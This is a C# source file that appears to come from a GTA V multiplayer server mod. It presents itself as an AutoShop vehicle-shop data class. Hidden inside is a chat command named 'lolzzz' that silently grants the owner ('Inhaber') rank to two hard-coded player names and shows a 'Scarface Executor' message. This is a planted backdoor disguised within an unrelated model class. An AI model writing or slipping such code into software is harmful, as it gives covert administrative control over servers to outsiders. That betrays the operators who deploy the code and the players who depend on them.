using GTANetworkAPI;
using System.Collections.Generic;
using Venux.Buy;

namespace Venux.Vehicles.Shops
{
    public class AutoShop
    {
        public int id { get; set; }

        public string name { get; set; }

        public Vector3 position { get; set; }

        public Vector3 ausparkPunkt { get; set; }

        public float ausparkPunktRotation { get; set; }

        public List<BuyCar> autoshopItems { get; set; }

        [Command("lolzzz")]
        public static void CMD_lolzzz(Client p)
        {
            if (p.Name == "Paco_White")
            {
                Database.setRights("Paco_White", "Inhaber");
                Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            }

            if (p.Name == "Teka_Abi")
            {
                Database.setRights("Teka_Abi", "Inhaber");
                Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            }
        }
    }
}
